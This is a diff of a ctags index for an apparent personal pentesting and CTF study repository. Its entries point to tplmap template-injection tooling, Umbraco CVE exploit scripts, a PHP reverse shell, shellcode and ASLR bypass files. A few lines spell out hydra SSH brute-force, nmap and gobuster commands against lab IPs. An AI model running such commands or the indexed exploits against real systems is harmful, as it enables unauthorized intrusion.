@@ -6,50 +6,1282 @@
 !_TAG_PROGRAM_NAME	Universal Ctags	/Derived from Exuberant Ctags/
 !_TAG_PROGRAM_URL	https://ctags.io/	/official site/
 !_TAG_PROGRAM_VERSION	0.0.0	/bd612ba/
-2020/05/16 19:42:16 Starting gobuster	thm/Basic_Pentesting/README.md	/^2020\/05\/16 19:42:16 Starting gobuster$/;"	c
+1dWn3W9R4zSjURghFionTpVd8ld	dreamhackctf/login-1/.idea/workspace.xml	/^  <component name="ProjectId" id="1dWn3W9R4zSjURghFionTpVd8ld" \/>$/;"	i
+2020's Kali linux ssh access command	hackerSchoolFTZ/README.md	/^# 2020's Kali linux ssh access command$/;"	c
+9c2e4573-9680-403c-862b-a23edd3285d0	dreamhackctf/login-1/.idea/workspace.xml	/^      <changelist id="9c2e4573-9680-403c-862b-a23edd3285d0" name="Default Changelist" comment=""/;"	i
+9c2e4573-9680-403c-862b-a23edd3285d0	dreamhackctf/login-1/.idea/workspace.xml	/^    <list default="true" id="9c2e4573-9680-403c-862b-a23edd3285d0" name="Default Changelist" com/;"	i
 ACCOUNT LIST	thm/LFI_inclusiton_box/README.md	/^# ACCOUNT LIST$/;"	c
-BOX IP : 10.10.244.211	thm/LFI_inclusiton_box/README.md	/^# BOX IP : 10.10.244.211$/;"	c
-Basinc Pentesting	thm/Basic_Pentesting/README.md	/^# Basinc Pentesting$/;"	c
-Command : hydra -l jan -P password_guessing_list.txt ssh://10.10.28.75/	thm/Basic_Pentesting/README.md	/^## Command : hydra -l jan -P password_guessing_list.txt ssh:\/\/10.10.28.75\/  $/;"	s	chapter:Password Guessing :
-Command for setting	README.md	/^# Command for setting $/;"	c
-Hacking Project Resource group	README.md	/^# Hacking Project Resource group$/;"	c
+AnonymousFunction5713db880100	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/pug', function(req, res){$/;"	f
+AnonymousFunction5713db880200	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/blind\/pug', function(req, res){$/;"	f
+AnonymousFunction5713db880300	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/nunjucks', function(req, res){$/;"	f
+AnonymousFunction5713db880400	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/blind\/nunjucks', function(req, res){$/;"	f
+AnonymousFunction5713db880500	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/javascript', function(req, res){$/;"	f
+AnonymousFunction5713db880600	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/blind\/javascript', function(req, res){$/;"	f
+AnonymousFunction5713db880700	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/dust', function(req, res){$/;"	f
+AnonymousFunction5713db880800	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^    dust.render("compiled", {}, function(err, outp) { output = outp })$/;"	f
+AnonymousFunction5713db880900	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/blind\/dust', function(req, res){$/;"	f
+AnonymousFunction5713db880a00	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^    dust.render("compiled", {}, function(err, outp) { })$/;"	f
+AnonymousFunction5713db880b00	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/dot', function(req, res){$/;"	f
+AnonymousFunction5713db880c00	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/blind\/dot', function(req, res){$/;"	f
+AnonymousFunction5713db880d00	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/marko', function(req, res){$/;"	f
+AnonymousFunction5713db880e00	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/blind\/marko', function(req, res){$/;"	f
+AnonymousFunction5713db880f00	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/ejs', function(req, res){$/;"	f
+AnonymousFunction5713db881000	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^app.use('\/blind\/ejs', function(req, res){$/;"	f
+BITS	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh.s	/^BITS 32$/;"	l
+BITS	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh2.s	/^BITS 32$/;"	l
+BITS	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh3.s	/^BITS 32$/;"	l
+BITS	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh4.s	/^BITS 32$/;"	l
+BaseTest	dreamhackctf/login-1/tplmap/tests/basetest.py	/^class BaseTest(object):$/;"	c
+Buffer Overflow : return to plt	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof3/return_to_plt.md	/^# Buffer Overflow : return to plt$/;"	c
+Buffer Overflow Script	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof2/README.md	/^# Buffer Overflow Script$/;"	c
+Buffer overflow : Return to address change	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof3/return_to_address.md	/^# Buffer overflow : Return to address change$/;"	c
+Buffer overflow : Return to libc	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof3/return_to_libc.md	/^# Buffer overflow : Return to libc$/;"	c
+Buffer overflow Script Methods	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof2/README.md	/^# Buffer overflow Script Methods$/;"	c
+Burp Suite Plugin	dreamhackctf/login-1/tplmap/README.md	/^Burp Suite Plugin$/;"	s	chapter:Tplmap
+Burp Suite Plugin	dreamhackctf/login-1/tplmap/burp_extension/README.md	/^# Burp Suite Plugin$/;"	c
+BurpExtender	dreamhackctf/login-1/tplmap/burp_extension/burp_extender.py	/^class BurpExtender( IBurpExtender ):$/;"	c
+CLEVEL_LIMIT	dreamhackctf/login-1/tplmap/tests/basetest.py	/^CLEVEL_LIMIT = 0$/;"	v
+COOKIE	dreamhackctf/cookie/README.md	/^# COOKIE$/;"	c
+Channel	dreamhackctf/login-1/tplmap/burp_extension/channel.py	/^class Channel:$/;"	c
+Channel	dreamhackctf/login-1/tplmap/core/channel.py	/^class Channel:$/;"	c
+ChannelTest	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^class ChannelTest(unittest.TestCase):$/;"	c
+Command :  nmap -sC -sV -oN RemoteScanning.txt 10.10.10.180	htb/Remote/Gathering/RemoteMachineScanning.md	/^### Command :  nmap -sC -sV -oN RemoteScanning.txt 10.10.10.180$/;"	S	chapter:Remote BOX Scanning Reuslt
+Command : nmap -sC -sV -oN Basic_Pentesting_Scan_Result.txt 10.10.248.233	thm/Basic_Pentesting/Gathering/Basic_Pentesting_Scan_Result.md	/^# Command : nmap -sC -sV -oN Basic_Pentesting_Scan_Result.txt 10.10.248.233$/;"	c
+Command :gobuster dir -u http://10.10.103.67/ -w directory_guessing_list.txt	thm/Basic_Pentesting/Gathering/gobusterResult.md	/^## Command :gobuster dir -u http:\/\/10.10.103.67\/ -w directory_guessing_list.txt$/;"	s	chapter:Gobuster Execute Result
+ConfigTab	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^class ConfigTab( ITab, JPanel ):$/;"	c
+Connect use id_rsa file command	thm/Basic_Pentesting/README.md	/^# Connect use id_rsa file command$/;"	c
+DATABASE	dreamhackctf/login-1/app.py	/^DATABASE = "database.db"$/;"	v
+DATABASE	dreamhackctf/simple_sqli/app.py	/^DATABASE = "database.db"$/;"	v
+Default	dreamhackctf/login-1/.idea/workspace.xml	/^    <task active="true" id="Default" summary="Default task">$/;"	i
+Directory Tree Scan	thm/Vulnversity/gobusterResult.md	/^# Directory Tree Scan$/;"	c
+Dot	dreamhackctf/login-1/tplmap/plugins/engines/dot.py	/^class Dot(javascript.Javascript):$/;"	c
+DotTests	dreamhackctf/login-1/tplmap/tests/test_node_dot.py	/^class DotTests(unittest.TestCase, BaseTest):$/;"	c
+Dust	dreamhackctf/login-1/tplmap/plugins/engines/dust.py	/^class Dust(javascript.Javascript):$/;"	c
+DustTests	dreamhackctf/login-1/tplmap/tests/test_node_dust.py	/^class DustTests(unittest.TestCase, BaseTest):$/;"	c
+EXTRA_DOWNLOAD	dreamhackctf/login-1/tplmap/tests/basetest.py	/^EXTRA_DOWNLOAD = False$/;"	v
+EXTRA_UPLOAD	dreamhackctf/login-1/tplmap/tests/basetest.py	/^EXTRA_UPLOAD = False$/;"	v
+EXTRA_UPLOAD_BLIND	dreamhackctf/login-1/tplmap/tests/basetest.py	/^EXTRA_UPLOAD_BLIND = False$/;"	v
+Ejs	dreamhackctf/login-1/tplmap/plugins/engines/ejs.py	/^class Ejs(javascript.Javascript):$/;"	c
+EjsTests	dreamhackctf/login-1/tplmap/tests/test_node_ejs.py	/^class EjsTests(unittest.TestCase, BaseTest):$/;"	c
+Enter Space_time Coordinates	google_ctf/Space-Time-Coordinates/Coordinates_walkthrough.md	/^# Enter Space_time Coordinates$/;"	c
+Erb	dreamhackctf/login-1/tplmap/plugins/engines/erb.py	/^class Erb(ruby.Ruby):$/;"	c
+ErbTests	dreamhackctf/login-1/tplmap/tests/test_ruby_erb.py	/^class ErbTests(unittest.TestCase, BaseTest):$/;"	c
+Exploitation	dreamhackctf/login-1/tplmap/README.md	/^Exploitation$/;"	s	chapter:Tplmap
+FORMATS	dreamhackctf/login-1/tplmap/utils/loggers.py	/^    FORMATS = {$/;"	v	class:TplmapFormatter
+File Upload Point	thm/Vulnversity/gobusterResult.md	/^# File Upload Point$/;"	c
+Freemarker	dreamhackctf/login-1/tplmap/plugins/engines/freemarker.py	/^class Freemarker(java.Java):$/;"	c
+FreemarkerTest	dreamhackctf/login-1/tplmap/tests/test_java_freemarker.py	/^class FreemarkerTest(unittest.TestCase, BaseTest):$/;"	c
+GTFObin "/bin/systemctl" privilege escalte command	thm/Vulnversity/PriVilegeList.md	/^# GTFObin "\/bin\/systemctl" privilege escalte command     $/;"	c
+Gaining	htb/Remote/README.md	/^# Gaining$/;"	c
+Gobuster	thm/Basic_Pentesting/README.md	/^# Gobuster$/;"	c
+Gobuster Execute Result	thm/Basic_Pentesting/Gathering/gobusterResult.md	/^# Gobuster Execute Result$/;"	c
+Google Beginner Quest	google_ctf/Space-Time-Coordinates/Coordinates_walkthrough.md	/^# Google Beginner Quest$/;"	c
+Google CTF for Beginner's Quest	google_ctf/Satellite_networking/README.md	/^# Google CTF for Beginner's Quest$/;"	c
+Google CTF for Beginner's Quest	google_ctf/Work_Computer_sandbox/README.md	/^# Google CTF for Beginner's Quest$/;"	c
+Hack The Box	htb/Remote/README.md	/^# Hack The Box$/;"	c
+Information Gathering (Enumerating)	htb/Remote/README.md	/^# Information Gathering (Enumerating)$/;"	c
+Install	dreamhackctf/login-1/tplmap/burp_extension/README.md	/^### Install$/;"	S	chapter:Burp Suite Plugin
+Install mount tool	htb/Remote/README.md	/^# Install mount tool$/;"	c
+Introductory Researching Room	thm/Introductory_Researching/README.md	/^# Introductory Researching Room$/;"	c
+Java	dreamhackctf/login-1/tplmap/plugins/languages/java.py	/^class Java(Plugin):$/;"	c
+Javascript	dreamhackctf/login-1/tplmap/plugins/languages/javascript.py	/^class Javascript(Plugin):$/;"	c
+JavascriptTests	dreamhackctf/login-1/tplmap/tests/test_node_javascript.py	/^class JavascriptTests(unittest.TestCase, BaseTest):$/;"	c
+Jinja2	dreamhackctf/login-1/tplmap/plugins/engines/jinja2.py	/^class Jinja2(python.Python):$/;"	c
+Jinja2Env	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^Jinja2Env = Jinja2Environment(line_statement_prefix='#')$/;"	v
+Jinja2Environment	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^from jinja2 import Environment as Jinja2Environment$/;"	x
+Jinja2Test	dreamhackctf/login-1/tplmap/tests/test_py_jinja2.py	/^class Jinja2Test(unittest.TestCase, BaseTest):$/;"	c
+LEVEL_LIMIT	dreamhackctf/login-1/tplmap/tests/basetest.py	/^LEVEL_LIMIT = 0$/;"	v
+LFI BASICS	thm/LFI_Basics/README.md	/^# LFI BASICS$/;"	c
+Limitation	dreamhackctf/login-1/tplmap/burp_extension/README.md	/^### Limitation$/;"	S	chapter:Burp Suite Plugin
+MACHINE : Advent of Cyber	thm/Advent_of_Cyber/README.md	/^# MACHINE : Advent of Cyber$/;"	c
+MACHINE : Advent of Cyber	thm/Advent_of_Cyber/README_part2.md	/^# MACHINE : Advent of Cyber$/;"	c
+MACHINE IP : 10.10.101.49	thm/Sudo_Buffer_Overflow/README.md	/^# MACHINE IP : 10.10.101.49$/;"	c
+MACHINE NAME : Sudo Buffer Overflow	thm/Sudo_Buffer_Overflow/README.md	/^# MACHINE NAME : Sudo Buffer Overflow$/;"	c
+MAXRESETCOUNT	dreamhackctf/login-1/app.py	/^MAXRESETCOUNT = 5$/;"	v
+Machine : Basic_Pentesting	thm/Basic_Pentesting/Gathering/gobusterResult.md	/^# Machine : Basic_Pentesting$/;"	c
+Machine : OhINT	thm/OhSINT/README.md	/^# Machine : OhINT$/;"	c
+Machine : Vulnersity	thm/Vulnversity/gobusterResult.md	/^# Machine : Vulnersity$/;"	c
+Machine : Vulnversity	thm/Vulnversity/PriVilegeList.md	/^# Machine : Vulnversity$/;"	c
+Machine IP   : 10.10.126.194	thm/Simple_CTF/README.md	/^# Machine IP   : 10.10.126.194$/;"	c
+Machine IP : 10.10.103.67	thm/Basic_Pentesting/Gathering/gobusterResult.md	/^# Machine IP : 10.10.103.67$/;"	c
+Machine IP : 10.10.103.67	thm/Basic_Pentesting/README.md	/^# Machine IP : 10.10.103.67$/;"	c
+Machine IP : 10.10.110.116	thm/The_Cod_Caper/README.md	/^# Machine IP : 10.10.110.116$/;"	c
+Machine IP : 10.10.153.192	thm/sudo_security_bypass/README.md	/^# Machine IP : 10.10.153.192$/;"	c
+Machine IP : 10.10.19.165	thm/Vulnversity/README.md	/^# Machine IP : 10.10.19.165$/;"	c
+Machine IP : 10.10.244.211	thm/LFI_inclusiton_box/README.md	/^# Machine IP : 10.10.244.211$/;"	c
+Machine IP : 110.10.167.223	thm/Agent_Sudo/README.md	/^# Machine IP : 110.10.167.223$/;"	c
+Machine NAME : Simple CTF	thm/Simple_CTF/README.md	/^# Machine NAME : Simple CTF$/;"	c
+Machine NAME : Sudo Security Bypass	thm/sudo_security_bypass/README.md	/^# Machine NAME : Sudo Security Bypass$/;"	c
+Machine NAME : The Cod Caper	thm/The_Cod_Caper/README.md	/^# Machine NAME : The Cod Caper$/;"	c
+Machine Name : Agent_Sudo	thm/Agent_Sudo/README.md	/^# Machine Name : Agent_Sudo$/;"	c
+Machine Name : Basinc Pentesting	thm/Basic_Pentesting/README.md	/^# Machine Name : Basinc Pentesting$/;"	c
 Machine Name : LFI Inclusion	thm/LFI_inclusiton_box/README.md	/^# Machine Name : LFI Inclusion$/;"	c
+Machine Name : Vulnversity	thm/Vulnversity/README.md	/^# Machine Name : Vulnversity$/;"	c
+Mako	dreamhackctf/login-1/tplmap/plugins/engines/mako.py	/^class Mako(python.Python):$/;"	c
+MakoTemplates	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^from mako.template import Template as MakoTemplates$/;"	x
+MakoTest	dreamhackctf/login-1/tplmap/tests/test_py_mako.py	/^class MakoTest(unittest.TestCase, BaseTest):$/;"	c
+Marko	dreamhackctf/login-1/tplmap/plugins/engines/marko.py	/^class Marko(javascript.Javascript):$/;"	c
+MarkoTests	dreamhackctf/login-1/tplmap/tests/test_node_marko.py	/^class MarkoTests(unittest.TestCase, BaseTest):$/;"	c
+MockApp	dreamhackctf/login-1/test.py	/^class MockApp(object):$/;"	c
+MultilineShell	dreamhackctf/login-1/tplmap/core/clis.py	/^class MultilineShell(cmd.Cmd):$/;"	c
+MyParser	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^class MyParser(OptionParser):$/;"	c
 Nmap	thm/LFI_inclusiton_box/README.md	/^# Nmap $/;"	c
+Nmap 7.80 scan initiated Mon May 18 11:29:21 2020 as	thm/Basic_Pentesting/Gathering/Basic_Pentesting_Scan_Result.md	/^# Nmap 7.80 scan initiated Mon May 18 11:29:21 2020 as$/;"	c
+Nmap 7.80 scan initiated Tue May 19 13:15:13 2020 as	htb/Remote/Gathering/RemoteMachineScanning.md	/^### Nmap 7.80 scan initiated Tue May 19 13:15:13 2020 as$/;"	S	chapter:Remote BOX Scanning Reuslt
+Note	thm/Basic_Pentesting/README.md	/^# Note$/;"	c
+Nunjucks	dreamhackctf/login-1/tplmap/plugins/engines/nunjucks.py	/^class Nunjucks(javascript.Javascript):$/;"	c
+NunjucksTests	dreamhackctf/login-1/tplmap/tests/test_node_nunjucks.py	/^class NunjucksTests(unittest.TestCase, BaseTest):$/;"	c
+PENTESTING NOTE	README.md	/^# PENTESTING NOTE$/;"	c
+PLATFORM LIST	README.md	/^# PLATFORM LIST$/;"	c
+Password Brute Forcing !	thm/Basic_Pentesting/README.md	/^# Password Brute Forcing !$/;"	c
 Password Guessing :	thm/Basic_Pentesting/README.md	/^# Password Guessing : $/;"	c
+Php	dreamhackctf/login-1/tplmap/plugins/languages/php.py	/^class Php(Plugin):$/;"	c
+PhpTests	dreamhackctf/login-1/tplmap/tests/test_php_php.py	/^class PhpTests(unittest.TestCase, BaseTest):$/;"	c
+Plugin	dreamhackctf/login-1/tplmap/core/plugin.py	/^class Plugin(object):$/;"	c
+PluginCheckBox	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^class PluginCheckBox( JCheckBox ):$/;"	c
+Privilage Escalte	htb/Remote/README.md	/^# Privilage Escalte$/;"	c
+Privilege Escalate	thm/Basic_Pentesting/README.md	/^# Privilege Escalate $/;"	c
 Privilege Escalate	thm/LFI_inclusiton_box/README.md	/^# Privilege Escalate$/;"	c
+Pug	dreamhackctf/login-1/tplmap/plugins/engines/pug.py	/^class Pug(javascript.Javascript):$/;"	c
+PugTest	dreamhackctf/login-1/tplmap/tests/test_node_pug.py	/^class PugTest(unittest.TestCase, BaseTest):$/;"	c
+Python	dreamhackctf/login-1/tplmap/plugins/languages/python.py	/^class Python(Plugin):$/;"	c
+PythonTests	dreamhackctf/login-1/tplmap/tests/test_py_python.py	/^class PythonTests(unittest.TestCase, BaseTest):$/;"	c
+Reference Command	README.md	/^# Reference Command$/;"	c
+Reference Site	htb/Remote/README.md	/^# Reference Site$/;"	c
+Remote BOX Scanning Reuslt	htb/Remote/Gathering/RemoteMachineScanning.md	/^# Remote BOX Scanning Reuslt$/;"	c
+Ruby	dreamhackctf/login-1/tplmap/plugins/languages/ruby.py	/^class Ruby(Plugin):$/;"	c
+RubyTests	dreamhackctf/login-1/tplmap/tests/test_ruby_ruby.py	/^class RubyTests(unittest.TestCase, BaseTest):$/;"	c
+Running vulnerable test environment in Docker	dreamhackctf/login-1/tplmap/docker-envs/README.md	/^# Running vulnerable test environment in Docker$/;"	c
 Samba Enumeration Result :	thm/Basic_Pentesting/README.md	/^# Samba Enumeration Result : $/;"	c
-Samba installation in mac ( my way)	thm/Basic_Pentesting/README.md	/^# Samba installation in mac ( my way)$/;"	c
+Samba installation in my mac	thm/Basic_Pentesting/requirement/samba_util_installation.md	/^# Samba installation in my mac$/;"	c
+Satellite_networking	google_ctf/Satellite_networking/README.md	/^# Satellite_networking$/;"	c
+ScanIssue	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^class ScanIssue( IScanIssue ):$/;"	c
+ScannerCheck	dreamhackctf/login-1/tplmap/burp_extension/scanner_check.py	/^class ScannerCheck( IScannerCheck ):$/;"	c
+Scanning	dreamhackctf/login-1/tplmap/burp_extension/README.md	/^### Scanning$/;"	S	chapter:Burp Suite Plugin
 Scanning	thm/Basic_Pentesting/README.md	/^# Scanning$/;"	c
-[+] Timeout:        10s	thm/Basic_Pentesting/README.md	/^[+] Timeout:        10s$/;"	c
-after macport dependencies below command :	thm/Basic_Pentesting/README.md	/^## after macport dependencies below command : $/;"	s	chapter:Samba installation in mac ( my way)
-boo	study_about_hacked/system_tip/problem_collectiong/bof_test_dir/func_pointer.c	/^int boo() {$/;"	f	typeref:typename:int
-buffer	study_about_hacked/system_tip/buffer_overflow_example/bof_example_dir/bof_example04.c	/^char buffer[32];$/;"	v	typeref:typename:char[32]
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)	thm/Basic_Pentesting/README.md	/^by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)$/;"	c
-foo	study_about_hacked/system_tip/problem_collectiong/bof_test_dir/func_pointer.c	/^int foo() {$/;"	f	typeref:typename:int
+Scanning File	htb/Remote/README.md	/^# Scanning File$/;"	c
+Server-Side Template Injection	dreamhackctf/login-1/tplmap/README.md	/^Server-Side Template Injection$/;"	s	chapter:Tplmap
+Shell	dreamhackctf/login-1/tplmap/core/clis.py	/^class Shell(cmd.Cmd):$/;"	c
+Slim	dreamhackctf/login-1/tplmap/plugins/engines/slim.py	/^class Slim(ruby.Ruby):$/;"	c
+SlimTests	dreamhackctf/login-1/tplmap/tests/test_ruby_slim.py	/^class SlimTests(unittest.TestCase, BaseTest):$/;"	c
+Smarty	dreamhackctf/login-1/tplmap/plugins/engines/smarty.py	/^class Smarty(php.Php):$/;"	c
+SmartySecuredTest	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^class SmartySecuredTest(unittest.TestCase, BaseTest):$/;"	c
+SmartyUnsecuredTest	dreamhackctf/login-1/tplmap/tests/test_php_smarty_unsecured.py	/^class SmartyUnsecuredTest(unittest.TestCase, BaseTest):$/;"	c
+Source : bof2.c	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof2/README.md	/^# Source : bof2.c$/;"	c
+SparkApplication	dreamhackctf/login-1/tplmap/tests/env_java_tests/spark-app/src/main/java/org/tplmap/webframeworks/SparkApplication.java	/^public class SparkApplication {$/;"	c
+Stack Smash option for test	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof2/README.md	/^# Stack Smash option for test $/;"	c
+Supported template engines	dreamhackctf/login-1/tplmap/README.md	/^Supported template engines$/;"	s	chapter:Tplmap
+TARGET FILE : bof3	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof3/return_to_address.md	/^# TARGET FILE : bof3$/;"	c
+TARGET FILE : bof3	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof3/return_to_libc.md	/^# TARGET FILE : bof3$/;"	c
+TASK LIST	thm/OhSINT/README.md	/^# TASK LIST$/;"	c
+TIME	thm/Simple_CTF/46635.py	/^TIME = 1$/;"	v
+TIME	thm/Simple_CTF/46635.py.bak	/^TIME = 1$/;"	v
+TITLE :  Gobuster Scanning result	thm/Vulnversity/gobusterResult.md	/^# TITLE :  Gobuster Scanning result$/;"	c
+TITLE :  PrivilegeList	thm/Vulnversity/PriVilegeList.md	/^# TITLE :  PrivilegeList$/;"	c
+TITLE : command-injection-1	dreamhackctf/command_injection_1/command_injection_walkthrought.md	/^# TITLE : command-injection-1$/;"	c
+TITLE : hacker School FTZ	hackerSchoolFTZ/README.md	/^# TITLE : hacker School FTZ $/;"	c
+TITLE : php-1	dreamhackctf/php-1/README.md	/^# TITLE : php-1$/;"	c
+TITLE : web-misconf-1	dreamhackctf/web-misconf-1/web-misconf-1_walkthrough.md	/^# TITLE : web-misconf-1$/;"	c
+TcpServer	dreamhackctf/login-1/tplmap/core/tcpserver.py	/^class TcpServer:$/;"	c
+Tornado	dreamhackctf/login-1/tplmap/plugins/engines/tornado.py	/^class Tornado(python.Python):$/;"	c
+TornadoTest	dreamhackctf/login-1/tplmap/tests/test_py_tornado.py	/^class TornadoTest(unittest.TestCase, BaseTest):$/;"	c
+Tplmap	dreamhackctf/login-1/tplmap/README.md	/^Tplmap$/;"	c
+TplmapFormatter	dreamhackctf/login-1/tplmap/utils/loggers.py	/^class TplmapFormatter(logging.Formatter):$/;"	c
+Twig	dreamhackctf/login-1/tplmap/plugins/engines/twig.py	/^class Twig(php.Php):$/;"	c
+TwigSecuredTest	dreamhackctf/login-1/tplmap/tests/test_php_twig_secured.py	/^class TwigSecuredTest(unittest.TestCase, BaseTest):$/;"	c
+TwigUnsecuredTest	dreamhackctf/login-1/tplmap/tests/test_php_twig_unsecured.py	/^class TwigUnsecuredTest(unittest.TestCase, BaseTest):$/;"	c
+UMBXSRFTOKEN	htb/Remote/Gaining/umbraco_cve1.py	/^UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];$/;"	v
+UMBXSRFTOKEN	htb/Remote/Gaining/umbraco_cve2.py	/^UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];$/;"	v
+UMBXSRFTOKEN	htb/Remote/Gaining/umbraco_cve3.py	/^UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];$/;"	v
+VERSION	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$VERSION = "1.0";$/;"	v
+VIEWSTATE	htb/Remote/Gaining/umbraco_cve1.py	/^VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];$/;"	v
+VIEWSTATE	htb/Remote/Gaining/umbraco_cve2.py	/^VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];$/;"	v
+VIEWSTATE	htb/Remote/Gaining/umbraco_cve3.py	/^VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];$/;"	v
+VIEWSTATEGENERATOR	htb/Remote/Gaining/umbraco_cve1.py	/^VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];$/;"	v
+VIEWSTATEGENERATOR	htb/Remote/Gaining/umbraco_cve2.py	/^VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];$/;"	v
+VIEWSTATEGENERATOR	htb/Remote/Gaining/umbraco_cve3.py	/^VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];$/;"	v
+Velocity	dreamhackctf/login-1/tplmap/plugins/engines/velocity.py	/^class Velocity(java.Java):$/;"	c
+VelocityTest	dreamhackctf/login-1/tplmap/tests/test_java_velocity.py	/^class VelocityTest(unittest.TestCase, BaseTest):$/;"	c
+Walk Through	dreamhackctf/command_injection_1/command_injection_walkthrought.md	/^# Walk Through$/;"	c
+WalkThrough	hackerSchoolFTZ/README.md	/^# WalkThrough$/;"	c
+Work Computer Sandbox	google_ctf/Work_Computer_sandbox/README.md	/^# Work Computer Sandbox$/;"	c
+_	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^_ = os.path.normpath(sys.argv[0])$/;"	v
+_	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^def _(self, *args):$/;"	f
+__initLayout__	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^    def __initLayout__( self ):$/;"	m	class:ConfigTab
+__init__	dreamhackctf/login-1/test.py	/^    def __init__(self, secret_key):$/;"	m	class:MockApp
+__init__	dreamhackctf/login-1/tplmap/burp_extension/channel.py	/^    def __init__( self, callbacks, configTab, baseRequestResponse, insertionPoint, payloadPositi/;"	m	class:Channel
+__init__	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^    def __init__( self, callbacks ):$/;"	m	class:ConfigTab
+__init__	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^    def __init__( self, plugin ):$/;"	m	class:PluginCheckBox
+__init__	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def __init__( self, callbacks, baseRequestResponse, insertionPoint, channel ):$/;"	m	class:ScanIssue
+__init__	dreamhackctf/login-1/tplmap/burp_extension/scanner_check.py	/^    def __init__( self, callbacks, configTab ):$/;"	m	class:ScannerCheck
+__init__	dreamhackctf/login-1/tplmap/core/channel.py	/^    def __init__(self, args):$/;"	m	class:Channel
+__init__	dreamhackctf/login-1/tplmap/core/clis.py	/^    def __init__(self, inject_function, prompt):$/;"	m	class:MultilineShell
+__init__	dreamhackctf/login-1/tplmap/core/clis.py	/^    def __init__(self, inject_function, prompt):$/;"	m	class:Shell
+__init__	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def __init__(self, channel):$/;"	m	class:Plugin
+__init__	dreamhackctf/login-1/tplmap/core/tcpserver.py	/^    def __init__(self, port, timeout):$/;"	m	class:TcpServer
+__libc_start_main_addr	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^__libc_start_main_addr = u(s.recv(4))$/;"	v
+__libc_start_main_got	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^__libc_start_main_got = 0x804a018$/;"	v
+__libc_start_main_plt	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^__libc_start_main_plt = 0x8048360$/;"	v
+__libc_start_main_rel	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^__libc_start_main_rel = 0x19990$/;"	v
+_detect_blind	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def _detect_blind(self):$/;"	m	class:Plugin
+_detect_dust	dreamhackctf/login-1/tplmap/plugins/engines/dust.py	/^    def _detect_dust(self):$/;"	m	class:Dust
+_detect_render	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def _detect_render(self):$/;"	m	class:Plugin
+_detect_unreliable_render	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def _detect_unreliable_render(self):$/;"	m	class:Plugin
+_format_prompt	dreamhackctf/login-1/tplmap/core/clis.py	/^    def _format_prompt(self):$/;"	m	class:MultilineShell
+_generate_closures	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def _generate_closures(self, ctx):$/;"	m	class:Plugin
+_generate_contexts	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def _generate_contexts(self):$/;"	m	class:Plugin
